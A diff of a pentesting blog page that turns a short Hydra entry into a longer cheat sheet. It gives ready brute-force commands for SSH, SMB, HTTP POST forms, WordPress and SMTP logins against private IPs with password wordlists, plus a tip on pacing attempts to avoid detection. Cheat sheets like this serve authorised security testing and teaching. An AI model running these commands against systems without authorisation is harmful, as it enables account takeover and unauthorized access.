@@ -5,26 +5,93 @@
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 <meta name="robots" content="index, follow">
-<title>Hydra | Nooblogaurus</title>
-<meta name="keywords" content="cheat sheet, bruteforce">
-<meta name="description" content="Hydra is a password-cracking tool designed for brute-forcing authentication protocols. It supports a wide range of protocols and is highly configurable for various use cases.
-Basic Syntax
-hydra [options] &lt;IP&gt; &lt;protocol&gt;
-Common Flags
+<title>Hydra Cheat Sheet | Nooblogaurus</title>
+<meta name="keywords" content="cheat sheet, bruteforce, pentesting, authentication">
+<meta name="description" content="🛠️ Hydra Cheat Sheet
+💡 Hydra is a powerful password-cracking tool for brute-forcing authentication protocols. It supports various protocols and is highly customizable for complex scenarios.
 
--h: Display the help menu.
--l &lt;username&gt;: Specify a single username/login.
--L &lt;wordlist&gt;: Use a wordlist for usernames/logins.
--p &lt;password&gt;: Specify a single password.
--P &lt;wordlist&gt;: Use a wordlist for passwords.
--s &lt;PORT&gt;: Specify the target port.
--f: Stop brute-forcing after finding valid credentials.
--R: Restore a previous session.
--t &lt;number&gt;: Set the number of threads to use.
--V: Enable verbose mode.
+📌 1. Basic Syntax
+hydra [options] &lt;IP/Target&gt; &lt;protocol&gt;
+Examples:
 
-Supported Protocols
-Hydra supports numerous protocols, including:">
+Brute-force SSH login with a single username and password list:
+hydra -l admin -P passwords.txt 192.168.1.10 ssh
+
+Brute-force HTTP POST login form:
+hydra -l admin -P passwords.txt 192.168.1.10 http-post-form &#34;/login:username=^USER^&amp;password=^PASS^:F=Invalid login&#34;
+
+
+
+📌 2. Common Flags
+
+  
+      
+          Flag
+          Description
+      
+  
+  
+      
+          -h
+          Display help menu.
+      
+      
+          -l &lt;user&gt;
+          Single username/login.
+      
+      
+          -L &lt;file&gt;
+          Wordlist for usernames.
+      
+      
+          -p &lt;pass&gt;
+          Single password.
+      
+      
+          -P &lt;file&gt;
+          Wordlist for passwords.
+      
+      
+          -s &lt;port&gt;
+          Specify target port.
+      
+      
+          -f
+          Stop after finding valid credentials.
+      
+      
+          -R
+          Restore previous session.
+      
+      
+          -t &lt;num&gt;
+          Number of parallel threads (default: 16).
+      
+      
+          -V
+          Verbose output (show each attempt).
+      
+      
+          -I
+          Ignore an existing restore file.
+      
+      
+          -u
+          Loop usernames with each password attempt.
+      
+      
+          -w &lt;sec&gt;
+          Wait  seconds between retries.
+      
+      
+          -o &lt;file&gt;
+          Write found credentials to a file.
+      
+  
+
+
+📌 3. Supported Protocols
+Hydra supports a wide range of protocols, including:">
 <meta name="author" content="">
 <link rel="canonical" href="https://nooblogaurus.com/cheat-sheets/hydra/">
 <link crossorigin="anonymous" href="https://nooblogaurus.com/assets/css/stylesheet.d6fcd20a4fb86efa4dfac8ec95da60244cc8871042183da1ef28e3a762ad79c8.css" integrity="sha256-1vzSCk&#43;4bvpN&#43;sjsldpgJEzIhxBCGD2h7yjjp2Ktecg=" rel="preload stylesheet" as="style">
@@ -74,9 +141,10 @@ Hydra supports numerous protocols, including:">
     </style>
 </noscript><meta property="og:url" content="https://nooblogaurus.com/cheat-sheets/hydra/">
   <meta property="og:site_name" content="Nooblogaurus">
-  <meta property="og:title" content="Hydra">
-  <meta property="og:description" content="Hydra is a password-cracking tool designed for brute-forcing authentication protocols. It supports a wide range of protocols and is highly configurable for various use cases.
-Basic Syntax hydra [options] &lt;IP&gt; &lt;protocol&gt; Common Flags -h: Display the help menu. -l &lt;username&gt;: Specify a single username/login. -L &lt;wordlist&gt;: Use a wordlist for usernames/logins. -p &lt;password&gt;: Specify a single password. -P &lt;wordlist&gt;: Use a wordlist for passwords. -s &lt;PORT&gt;: Specify the target port. -f: Stop brute-forcing after finding valid credentials. -R: Restore a previous session. -t &lt;number&gt;: Set the number of threads to use. -V: Enable verbose mode. Supported Protocols Hydra supports numerous protocols, including:">
+  <meta property="og:title" content="Hydra Cheat Sheet">
+  <meta property="og:description" content="🛠️ Hydra Cheat Sheet 💡 Hydra is a powerful password-cracking tool for brute-forcing authentication protocols. It supports various protocols and is highly customizable for complex scenarios.
+📌 1. Basic Syntax hydra [options] &lt;IP/Target&gt; &lt;protocol&gt; Examples:
+Brute-force SSH login with a single username and password list: hydra -l admin -P passwords.txt 192.168.1.10 ssh Brute-force HTTP POST login form: hydra -l admin -P passwords.txt 192.168.1.10 http-post-form &#34;/login:username=^USER^&amp;password=^PASS^:F=Invalid login&#34; 📌 2. Common Flags Flag Description -h Display help menu. -l &lt;user&gt; Single username/login. -L &lt;file&gt; Wordlist for usernames. -p &lt;pass&gt; Single password. -P &lt;file&gt; Wordlist for passwords. -s &lt;port&gt; Specify target port. -f Stop after finding valid credentials. -R Restore previous session. -t &lt;num&gt; Number of parallel threads (default: 16). -V Verbose output (show each attempt). -I Ignore an existing restore file. -u Loop usernames with each password attempt. -w &lt;sec&gt; Wait seconds between retries. -o &lt;file&gt; Write found credentials to a file. 📌 3. Supported Protocols Hydra supports a wide range of protocols, including:">
   <meta property="og:locale" content="en-us">
   <meta property="og:type" content="article">
     <meta property="article:section" content="cheat-sheets">
@@ -84,26 +152,95 @@ Basic Syntax hydra [options] &lt;IP&gt; &lt;protocol&gt; Common Flags -h: Displa
     <meta property="article:modified_time" content="2024-12-15T00:00:00+00:00">
     <meta property="article:tag" content="Cheat Sheet">
     <meta property="article:tag" content="Bruteforce">
+    <meta property="article:tag" content="Pentesting">
+    <meta property="article:tag" content="Authentication">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Hydra">
-<meta name="twitter:description" content="Hydra is a password-cracking tool designed for brute-forcing authentication protocols. It supports a wide range of protocols and is highly configurable for various use cases.
-Basic Syntax
-hydra [options] &lt;IP&gt; &lt;protocol&gt;
-Common Flags
+<meta name="twitter:title" content="Hydra Cheat Sheet">
+<meta name="twitter:description" content="🛠️ Hydra Cheat Sheet
+💡 Hydra is a powerful password-cracking tool for brute-forcing authentication protocols. It supports various protocols and is highly customizable for complex scenarios.
 
--h: Display the help menu.
--l &lt;username&gt;: Specify a single username/login.
--L &lt;wordlist&gt;: Use a wordlist for usernames/logins.
--p &lt;password&gt;: Specify a single password.
--P &lt;wordlist&gt;: Use a wordlist for passwords.
--s &lt;PORT&gt;: Specify the target port.
--f: Stop brute-forcing after finding valid credentials.
--R: Restore a previous session.
--t &lt;number&gt;: Set the number of threads to use.
--V: Enable verbose mode.
+📌 1. Basic Syntax
+hydra [options] &lt;IP/Target&gt; &lt;protocol&gt;
+Examples:
 
-Supported Protocols
-Hydra supports numerous protocols, including:">
+Brute-force SSH login with a single username and password list:
+hydra -l admin -P passwords.txt 192.168.1.10 ssh
+
+Brute-force HTTP POST login form:
+hydra -l admin -P passwords.txt 192.168.1.10 http-post-form &#34;/login:username=^USER^&amp;password=^PASS^:F=Invalid login&#34;
+
+
+
+📌 2. Common Flags
+
+  
+      
+          Flag
+          Description
+      
+  
+  
+      
+          -h
+          Display help menu.
+      
+      
+          -l &lt;user&gt;
+          Single username/login.
+      
+      
+          -L &lt;file&gt;
+          Wordlist for usernames.
+      
+      
+          -p &lt;pass&gt;
+          Single password.
+      
+      
+          -P &lt;file&gt;
+          Wordlist for passwords.
+      
+      
+          -s &lt;port&gt;
+          Specify target port.
+      
+      
+          -f
+          Stop after finding valid credentials.
+      
+      
+          -R
+          Restore previous session.
+      
+      
+          -t &lt;num&gt;
+          Number of parallel threads (default: 16).
+      
+      
+          -V
+          Verbose output (show each attempt).
+      
+      
+          -I
+          Ignore an existing restore file.
+      
+      
+          -u
+          Loop usernames with each password attempt.
+      
+      
+          -w &lt;sec&gt;
+          Wait  seconds between retries.
+      
+      
+          -o &lt;file&gt;
+          Write found credentials to a file.
+      
+  
+
+
+📌 3. Supported Protocols
+Hydra supports a wide range of protocols, including:">
 
 
 <script type="application/ld+json">
@@ -120,7 +257,7 @@ Hydra supports numerous protocols, including:">
     {
       "@type": "ListItem",
       "position":  2 ,
-      "name": "Hydra",
+      "name": "Hydra Cheat Sheet",
       "item": "https://nooblogaurus.com/cheat-sheets/hydra/"
     }
   ]
@@ -130,14 +267,14 @@ Hydra supports numerous protocols, including:">
 {
   "@context": "https://schema.org",
   "@type": "BlogPosting",
-  "headline": "Hydra",
-  "name": "Hydra",
-  "description": "Hydra is a password-cracking tool designed for brute-forcing authentication protocols. It supports a wide range of protocols and is highly configurable for various use cases.\nBasic Syntax hydra [options] \u0026lt;IP\u0026gt; \u0026lt;protocol\u0026gt; Common Flags -h: Display the help menu. -l \u0026lt;username\u0026gt;: Specify a single username/login. -L \u0026lt;wordlist\u0026gt;: Use a wordlist for usernames/logins. -p \u0026lt;password\u0026gt;: Specify a single password. -P \u0026lt;wordlist\u0026gt;: Use a wordlist for passwords. -s \u0026lt;PORT\u0026gt;: Specify the target port. -f: Stop brute-forcing after finding valid credentials. -R: Restore a previous session. -t \u0026lt;number\u0026gt;: Set the number of threads to use. -V: Enable verbose mode. Supported Protocols Hydra supports numerous protocols, including:\n",
+  "headline": "Hydra Cheat Sheet",
+  "name": "Hydra Cheat Sheet",
+  "description": "🛠️ Hydra Cheat Sheet 💡 Hydra is a powerful password-cracking tool for brute-forcing authentication protocols. It supports various protocols and is highly customizable for complex scenarios.\n📌 1. Basic Syntax hydra [options] \u0026lt;IP/Target\u0026gt; \u0026lt;protocol\u0026gt; Examples:\nBrute-force SSH login with a single username and password list: hydra -l admin -P passwords.txt 192.168.1.10 ssh Brute-force HTTP POST login form: hydra -l admin -P passwords.txt 192.168.1.10 http-post-form \u0026#34;/login:username=^USER^\u0026amp;password=^PASS^:F=Invalid login\u0026#34; 📌 2. Common Flags Flag Description -h Display help menu. -l \u0026lt;user\u0026gt; Single username/login. -L \u0026lt;file\u0026gt; Wordlist for usernames. -p \u0026lt;pass\u0026gt; Single password. -P \u0026lt;file\u0026gt; Wordlist for passwords. -s \u0026lt;port\u0026gt; Specify target port. -f Stop after finding valid credentials. -R Restore previous session. -t \u0026lt;num\u0026gt; Number of parallel threads (default: 16). -V Verbose output (show each attempt). -I Ignore an existing restore file. -u Loop usernames with each password attempt. -w \u0026lt;sec\u0026gt; Wait seconds between retries. -o \u0026lt;file\u0026gt; Write found credentials to a file. 📌 3. Supported Protocols Hydra supports a wide range of protocols, including:\n",
   "keywords": [
-    "cheat sheet", "bruteforce"
+    "cheat sheet", "bruteforce", "pentesting", "authentication"
   ],
-  "articleBody": "Hydra is a password-cracking tool designed for brute-forcing authentication protocols. It supports a wide range of protocols and is highly configurable for various use cases.\nBasic Syntax hydra [options] Common Flags -h: Display the help menu. -l : Specify a single username/login. -L : Use a wordlist for usernames/logins. -p : Specify a single password. -P : Use a wordlist for passwords. -s : Specify the target port. -f: Stop brute-forcing after finding valid credentials. -R: Restore a previous session. -t : Set the number of threads to use. -V: Enable verbose mode. Supported Protocols Hydra supports numerous protocols, including:\nSSH FTP POP3 HTTP-FORM-GET HTTP-FORM-POST HTTP-HEAD HTTP-POST HTTP-GET IMAP SMB SMTP MySQL For the full list, refer to Hydra’s help menu (hydra -h).\nExamples SSH Brute-Force Attack hydra -l admin -P rockyou.txt 192.168.10.10 ssh SSH with Multiple Usernames hydra -L top-usernames-shortlist.txt -P rockyou.txt 192.168.10.10 ssh SMB Brute-Force Attack hydra -L top-usernames-shortlist.txt -P rockyou.txt 192.168.10.10 smb Brute-Forcing HTTP POST Forms Hydra can handle custom HTTP POST forms:\nhydra -l admin -P rockyou.txt 192.168.10.10 http-post-form \\ \"/login:username=admin\u0026password=^PASS^:F=Your password is incorrect\" Wordpress Login Brute-Force Hydra can target WordPress login forms with custom parameters:\nhydra -l admin -P rockyou.txt 192.168.10.10 -V http-form-post \\ \"/wp-login.php:log=admin\u0026pwd=^PASS^\u0026wp-submit=Log In\u0026testcookie=1:S=Location\" Tips and Tricks Session Management: Use -R to restore interrupted sessions without starting over. Efficiency: Adjust the number of threads with -t to balance speed and server load. Verbose Mode: Use -V to see each login attempt in real-time, useful for troubleshooting. Custom Form Parameters: Understand the target login form structure to craft precise Hydra commands. –\n",
-  "wordCount" : "260",
+  "articleBody": "🛠️ Hydra Cheat Sheet 💡 Hydra is a powerful password-cracking tool for brute-forcing authentication protocols. It supports various protocols and is highly customizable for complex scenarios.\n📌 1. Basic Syntax hydra [options] Examples:\nBrute-force SSH login with a single username and password list: hydra -l admin -P passwords.txt 192.168.1.10 ssh Brute-force HTTP POST login form: hydra -l admin -P passwords.txt 192.168.1.10 http-post-form \"/login:username=^USER^\u0026password=^PASS^:F=Invalid login\" 📌 2. Common Flags Flag Description -h Display help menu. -l Single username/login. -L Wordlist for usernames. -p Single password. -P Wordlist for passwords. -s Specify target port. -f Stop after finding valid credentials. -R Restore previous session. -t Number of parallel threads (default: 16). -V Verbose output (show each attempt). -I Ignore an existing restore file. -u Loop usernames with each password attempt. -w Wait seconds between retries. -o Write found credentials to a file. 📌 3. Supported Protocols Hydra supports a wide range of protocols, including:\nSSH FTP POP3 HTTP-FORM-GET HTTP-FORM-POST HTTP-HEAD HTTP-POST HTTP-GET IMAP SMB SMTP MySQL Telnet VNC RDP List all supported protocols:\nhydra -U 📌 4. Examples 🛡️ 4.1 SSH Brute-Force Attack Single User, Password List:\nhydra -l root -P rockyou.txt 192.168.1.10 ssh Username List and Password List:\nhydra -L users.txt -P passwords.txt 192.168.1.10 ssh Specify Port and Threads:\nhydra -L users.txt -P passwords.txt -s 2222 -t 10 192.168.1.10 ssh 📂 4.2 SMB Brute-Force Attack Enumerate SMB with credentials:\nhydra -L users.txt -P passwords.txt 192.168.1.10 smb With a specific port:\nhydra -L users.txt -P passwords.txt -s 445 192.168.1.10 smb 🌐 4.3 HTTP POST Brute-Force Simple HTTP POST Form:\nhydra -l admin -P rockyou.txt 192.168.1.10 http-post-form \\ \"/login:username=^USER^\u0026password=^PASS^:F=Invalid credentials\" Verbose Mode with Output File:\nhydra -L users.txt -P passwords.txt -o results.txt -V 192.168.1.10 http-post-form \\ \"/login:username=^USER^\u0026password=^PASS^:F=Invalid login\" 📝 4.4 WordPress Login Brute-Force Target WordPress Login Page:\nhydra -L users.txt -P passwords.txt -V 192.168.1.10 http-form-post \\ \"/wp-login.php:log=^USER^\u0026pwd=^PASS^\u0026wp-submit=Log In:S=Location\" 📧 4.5 SMTP Brute-Force Target SMTP Server (Port 25):\nhydra -L users.txt -P passwords.txt -s 25 192.168.1.10 smtp Secure SMTP (Port 465):\nhydra -L users.txt -P passwords.txt -s 465 192.168.1.10 smtp -S 📌 5. Advanced Techniques 🧠 Session Management Save Progress and Restore Session: hydra -L users.txt -P passwords.txt -R 192.168.1.10 ssh Ignore Existing Restore File: hydra -I -L users.txt -P passwords.txt 192.168.1.10 ssh ⚙️ Efficiency Optimization Adjust Threads: hydra -t 64 -L users.txt -P passwords.txt 192.168.1.10 ssh Add Delay Between Attempts: hydra -L users.txt -P passwords.txt -w 1 192.168.1.10 ssh 🔒 Custom User-Agent for HTTP Brute-Force hydra -l admin -P passwords.txt 192.168.1.10 http-post-form \\ \"/login:username=^USER^\u0026password=^PASS^:F=Incorrect login\" \\ -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0)\" 📌 6. Output and Logging Save Results to a File: hydra -L users.txt -P passwords.txt -o results.txt 192.168.1.10 ssh Verbose Output: hydra -V -L users.txt -P passwords.txt 192.168.1.10 ssh 📌 7. Tips and Tricks Understand Target Forms: Inspect login forms with browser tools (Inspect Element) to identify fields. Use Small Wordlists First: Start with smaller wordlists for quick checks. Don’t Overload Targets: Be mindful of threads (-t) and delays (-w) to avoid detection. Handle Captchas \u0026 Rate-Limiting: Some targets may require special handling or custom scripts. 📌 8. Documentation and Resources Official Hydra GitHub: Hydra GitHub Repository Hydra Manual: man hydra Kali Linux Documentation: Kali Tools - Hydra ",
+  "wordCount" : "537",
   "inLanguage": "en",
   "datePublished": "2024-12-15T00:00:00Z",
   "dateModified": "2024-12-15T00:00:00Z",
@@ -231,30 +368,97 @@ Hydra supports numerous protocols, including:">
   <header class="post-header">
     
     <h1 class="post-title entry-hint-parent">
-      Hydra
+      Hydra Cheat Sheet
     </h1>
     <div class="post-meta"><span title='2024-12-15 00:00:00 +0000 UTC'>December 15, 2024</span>
 
 </div>
   </header> 
-  <div class="post-content"><p><strong>Hydra</strong> is a password-cracking tool designed for brute-forcing authentication protocols. It supports a wide range of protocols and is highly configurable for various use cases.</p>
-<h2 id="basic-syntax">Basic Syntax<a hidden class="anchor" aria-hidden="true" href="#basic-syntax">#</a></h2>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hydra <span style="color:#f92672">[</span>options<span style="color:#f92672">]</span> &lt;IP&gt; &lt;protocol&gt;
-</span></span></code></pre></div><h2 id="common-flags">Common Flags<a hidden class="anchor" aria-hidden="true" href="#common-flags">#</a></h2>
+  <div class="post-content"><h3 id="-hydra-cheat-sheet"><strong>🛠️ Hydra Cheat Sheet</strong><a hidden class="anchor" aria-hidden="true" href="#-hydra-cheat-sheet">#</a></h3>
+<p><strong>💡 Hydra</strong> is a powerful password-cracking tool for brute-forcing authentication protocols. It supports various protocols and is highly customizable for complex scenarios.</p>
+<hr>
+<h2 id="-1-basic-syntax">📌 <strong>1. Basic Syntax</strong><a hidden class="anchor" aria-hidden="true" href="#-1-basic-syntax">#</a></h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hydra <span style="color:#f92672">[</span>options<span style="color:#f92672">]</span> &lt;IP/Target&gt; &lt;protocol&gt;
+</span></span></code></pre></div><p><strong>Examples:</strong></p>
 <ul>
-<li><strong><code>-h</code></strong>: Display the help menu.</li>
-<li><strong><code>-l &lt;username&gt;</code></strong>: Specify a single username/login.</li>
-<li><strong><code>-L &lt;wordlist&gt;</code></strong>: Use a wordlist for usernames/logins.</li>
-<li><strong><code>-p &lt;password&gt;</code></strong>: Specify a single password.</li>
-<li><strong><code>-P &lt;wordlist&gt;</code></strong>: Use a wordlist for passwords.</li>
-<li><strong><code>-s &lt;PORT&gt;</code></strong>: Specify the target port.</li>
-<li><strong><code>-f</code></strong>: Stop brute-forcing after finding valid credentials.</li>
-<li><strong><code>-R</code></strong>: Restore a previous session.</li>
-<li><strong><code>-t &lt;number&gt;</code></strong>: Set the number of threads to use.</li>
-<li><strong><code>-V</code></strong>: Enable verbose mode.</li>
+<li>Brute-force SSH login with a single username and password list:
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hydra -l admin -P passwords.txt 192.168.1.10 ssh
+</span></span></code></pre></div></li>
+<li>Brute-force HTTP POST login form:
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hydra -l admin -P passwords.txt 192.168.1.10 http-post-form <span style="color:#e6db74">&#34;/login:username=^USER^&amp;password=^PASS^:F=Invalid login&#34;</span>
+</span></span></code></pre></div></li>
 </ul>
-<h2 id="supported-protocols">Supported Protocols<a hidden class="anchor" aria-hidden="true" href="#supported-protocols">#</a></h2>
-<p>Hydra supports numerous protocols, including:</p>
+<hr>
+<h2 id="-2-common-flags">📌 <strong>2. Common Flags</strong><a hidden class="anchor" aria-hidden="true" href="#-2-common-flags">#</a></h2>
+<table>
+  <thead>
+      <tr>
+          <th><strong>Flag</strong></th>
+          <th><strong>Description</strong></th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><code>-h</code></td>
+          <td>Display help menu.</td>
+      </tr>
+      <tr>
+          <td><code>-l &lt;user&gt;</code></td>
+          <td>Single username/login.</td>
+      </tr>
+      <tr>
+          <td><code>-L &lt;file&gt;</code></td>
+          <td>Wordlist for usernames.</td>
+      </tr>
+      <tr>
+          <td><code>-p &lt;pass&gt;</code></td>
+          <td>Single password.</td>
+      </tr>
+      <tr>
+          <td><code>-P &lt;file&gt;</code></td>
+          <td>Wordlist for passwords.</td>
+      </tr>
+      <tr>
+          <td><code>-s &lt;port&gt;</code></td>
+          <td>Specify target port.</td>
+      </tr>
+      <tr>
+          <td><code>-f</code></td>
+          <td>Stop after finding valid credentials.</td>
+      </tr>
+      <tr>
+          <td><code>-R</code></td>
+          <td>Restore previous session.</td>
+      </tr>
+      <tr>
+          <td><code>-t &lt;num&gt;</code></td>
+          <td>Number of parallel threads (default: 16).</td>
+      </tr>
+      <tr>
+          <td><code>-V</code></td>
+          <td>Verbose output (show each attempt).</td>
+      </tr>
+      <tr>
+          <td><code>-I</code></td>
+          <td>Ignore an existing restore file.</td>
+      </tr>
+      <tr>
+          <td><code>-u</code></td>
+          <td>Loop usernames with each password attempt.</td>
+      </tr>
+      <tr>
+          <td><code>-w &lt;sec&gt;</code></td>
+          <td>Wait <!-- raw HTML omitted --> seconds between retries.</td>
+      </tr>
+      <tr>
+          <td><code>-o &lt;file&gt;</code></td>
+          <td>Write found credentials to a file.</td>
+      </tr>
+  </tbody>
+</table>
+<hr>
+<h2 id="-3-supported-protocols">📌 <strong>3. Supported Protocols</strong><a hidden class="anchor" aria-hidden="true" href="#-3-supported-protocols">#</a></h2>
+<p><strong>Hydra supports a wide range of protocols, including:</strong></p>
 <ul>
 <li><strong>SSH</strong></li>
 <li><strong>FTP</strong></li>
@@ -268,31 +472,98 @@ Hydra supports numerous protocols, including:">
 <li><strong>SMB</strong></li>
 <li><strong>SMTP</strong></li>
 <li><strong>MySQL</strong></li>
+<li><strong>Telnet</strong></li>
+<li><strong>VNC</strong></li>
+<li><strong>RDP</strong></li>
 </ul>
-<p>For the full list, refer to Hydra&rsquo;s help menu (<code>hydra -h</code>).</p>
-<h2 id="examples">Examples<a hidden class="anchor" aria-hidden="true" href="#examples">#</a></h2>
-<h3 id="ssh-brute-force-attack">SSH Brute-Force Attack<a hidden class="anchor" aria-hidden="true" href="#ssh-brute-force-attack">#</a></h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hydra -l admin -P rockyou.txt 192.168.10.10 ssh
-</span></span></code></pre></div><h3 id="ssh-with-multiple-usernames">SSH with Multiple Usernames<a hidden class="anchor" aria-hidden="true" href="#ssh-with-multiple-usernames">#</a></h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hydra -L top-usernames-shortlist.txt -P rockyou.txt 192.168.10.10 ssh
-</span></span></code></pre></div><h3 id="smb-brute-force-attack">SMB Brute-Force Attack<a hidden class="anchor" aria-hidden="true" href="#smb-brute-force-attack">#</a></h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hydra -L top-usernames-shortlist.txt -P rockyou.txt 192.168.10.10 smb
-</span></span></code></pre></div><h2 id="brute-forcing-http-post-forms">Brute-Forcing HTTP POST Forms<a hidden class="anchor" aria-hidden="true" href="#brute-forcing-http-post-forms">#</a></h2>
-<p>Hydra can handle custom HTTP POST forms:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hydra -l admin -P rockyou.txt 192.168.10.10 http-post-form <span style="color:#ae81ff">\
-</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span><span style="color:#e6db74">&#34;/login:username=admin&amp;password=^PASS^:F=Your password is incorrect&#34;</span>
-</span></span></code></pre></div><h3 id="wordpress-login-brute-force">Wordpress Login Brute-Force<a hidden class="anchor" aria-hidden="true" href="#wordpress-login-brute-force">#</a></h3>
-<p>Hydra can target WordPress login forms with custom parameters:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hydra -l admin -P rockyou.txt 192.168.10.10 -V http-form-post <span style="color:#ae81ff">\
-</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span><span style="color:#e6db74">&#34;/wp-login.php:log=admin&amp;pwd=^PASS^&amp;wp-submit=Log In&amp;testcookie=1:S=Location&#34;</span>
-</span></span></code></pre></div><h2 id="tips-and-tricks">Tips and Tricks<a hidden class="anchor" aria-hidden="true" href="#tips-and-tricks">#</a></h2>
+<p><strong>List all supported protocols:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hydra -U
+</span></span></code></pre></div><hr>
+<h2 id="-4-examples">📌 <strong>4. Examples</strong><a hidden class="anchor" aria-hidden="true" href="#-4-examples">#</a></h2>
+<h3 id="-41-ssh-brute-force-attack"><strong>🛡️ 4.1 SSH Brute-Force Attack</strong><a hidden class="anchor" aria-hidden="true" href="#-41-ssh-brute-force-attack">#</a></h3>
+<p><strong>Single User, Password List:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hydra -l root -P rockyou.txt 192.168.1.10 ssh
+</span></span></code></pre></div><p><strong>Username List and Password List:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hydra -L users.txt -P passwords.txt 192.168.1.10 ssh
+</span></span></code></pre></div><p><strong>Specify Port and Threads:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hydra -L users.txt -P passwords.txt -s <span style="color:#ae81ff">2222</span> -t <span style="color:#ae81ff">10</span> 192.168.1.10 ssh
+</span></span></code></pre></div><hr>
+<h3 id="-42-smb-brute-force-attack"><strong>📂 4.2 SMB Brute-Force Attack</strong><a hidden class="anchor" aria-hidden="true" href="#-42-smb-brute-force-attack">#</a></h3>
+<p><strong>Enumerate SMB with credentials:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hydra -L users.txt -P passwords.txt 192.168.1.10 smb
+</span></span></code></pre></div><p><strong>With a specific port:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hydra -L users.txt -P passwords.txt -s <span style="color:#ae81ff">445</span> 192.168.1.10 smb
+</span></span></code></pre></div><hr>
+<h3 id="-43-http-post-brute-force"><strong>🌐 4.3 HTTP POST Brute-Force</strong><a hidden class="anchor" aria-hidden="true" href="#-43-http-post-brute-force">#</a></h3>
+<p><strong>Simple HTTP POST Form:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hydra -l admin -P rockyou.txt 192.168.1.10 http-post-form <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span><span style="color:#e6db74">&#34;/login:username=^USER^&amp;password=^PASS^:F=Invalid credentials&#34;</span>
+</span></span></code></pre></div><p><strong>Verbose Mode with Output File:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hydra -L users.txt -P passwords.txt -o results.txt -V 192.168.1.10 http-post-form <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span><span style="color:#e6db74">&#34;/login:username=^USER^&amp;password=^PASS^:F=Invalid login&#34;</span>
+</span></span></code></pre></div><hr>
+<h3 id="-44-wordpress-login-brute-force"><strong>📝 4.4 WordPress Login Brute-Force</strong><a hidden class="anchor" aria-hidden="true" href="#-44-wordpress-login-brute-force">#</a></h3>
+<p><strong>Target WordPress Login Page:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hydra -L users.txt -P passwords.txt -V 192.168.1.10 http-form-post <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span><span style="color:#e6db74">&#34;/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log In:S=Location&#34;</span>
+</span></span></code></pre></div><hr>
+<h3 id="-45-smtp-brute-force"><strong>📧 4.5 SMTP Brute-Force</strong><a hidden class="anchor" aria-hidden="true" href="#-45-smtp-brute-force">#</a></h3>
